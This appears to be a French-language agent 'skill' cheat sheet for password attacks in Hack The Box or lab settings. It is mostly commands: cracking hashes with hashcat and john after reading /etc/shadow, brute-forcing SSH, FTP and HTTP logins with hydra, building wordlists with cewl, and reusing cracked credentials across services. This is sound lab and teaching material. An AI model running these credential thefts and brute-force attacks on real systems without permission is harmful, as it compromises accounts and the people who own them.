---
name: htb-password-attacks
description: >
  Attaques sur mots de passe et hashes dans un contexte HTB/lab autorisé.
  À déclencher quand on a un service d'authentification à forcer (SSH, HTTP login,
  FTP, RDP, SMB) ou un hash à casser. Couvre : identification de hash
  (hash-identifier), craquage offline (john, hashcat) avec règles et wordlists,
  brute force online ciblé (hydra), génération de wordlists (cewl), et
  manipulation de rockyou/SecLists. Produit des mots de passe en clair.
metadata:
  type: reference
  category: credentials
  legal: "Cibles autorisées uniquement (HTB, labs, CTF, systèmes vous appartenant)."
---

# HTB — Attaques sur mots de passe

## Quand utiliser cette skill
- Vous avez un **hash** (extrait de /etc/shadow, d'une base, d'un Kerberoast…).
- Vous avez un **service d'auth** et une liste d'utilisateurs à tester.

## A. Craquage offline (préféré : pas de bruit réseau)

### 1) Identifier le hash
```bash
hash-identifier            # interactif
# ou repérer le mode hashcat sur hashcat.net/wiki/example_hashes
```

### 2) hashcat (rapide, GPU) — modes fréquents en HTB
| Type | `-m` |
|---|---|
| MD5 | 0 |
| SHA-256 | 1400 |
| NTLM | 1000 |
| NetNTLMv2 | 5600 |
| Kerberos AS-REP | 18200 |
| Kerberos TGS (Kerberoast) | 13100 |
| bcrypt | 3200 |
| /etc/shadow sha512crypt | 1800 |

```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt
# avec règles (fortement recommandé)
hashcat -m 1000 hashes.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

### 3) john (pratique pour formats système)
```bash
# fusionner passwd + shadow
unshadow /etc/passwd /etc/shadow > unshadowed.txt
john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt
john --show unshadowed.txt

# formats spéciaux via *2john
ssh2john id_rsa > id_rsa.hash && john --wordlist=rockyou.txt id_rsa.hash
zip2john secret.zip > zip.hash && john zip.hash
keepass2john db.kdbx > kp.hash && john kp.hash
```

## B. Brute force online (ciblé, dernier recours)

```bash
IP=10.10.10.10
# SSH
hydra -l user -P rockyou.txt ssh://"$IP" -t 4
# FTP
hydra -L users.txt -P rockyou.txt ftp://"$IP"
# HTTP POST form (adapter les champs et le message d'échec)
hydra -l admin -P rockyou.txt "$IP" http-post-form \
  "/login.php:user=^USER^&pass=^PASS^:Invalid credentials"
# SMB / WinRM : préférer netexec (voir htb-smb-enum / htb-active-directory)
```

## C. Générer une wordlist ciblée
```bash
cewl -d 2 -m 5 http://"$IP" -w custom.txt        # mots du site
# variations (leetspeak, années) :
hashcat --stdout custom.txt -r /usr/share/hashcat/rules/best64.rule > custom-mangled.txt
```

## Réflexes
- Toujours essayer le **password reuse** avant de brute forcer : un mot de passe
  trouvé quelque part marche souvent ailleurs.
- Online brute force = risque de lockout ; garder `-t` bas et cibler un seul user.
- Après craquage, réinjecter les creds dans SMB/WinRM/SSH (`netexec ... -u -p`).
- Noter chaque paire user:pass dans `creds.txt`.
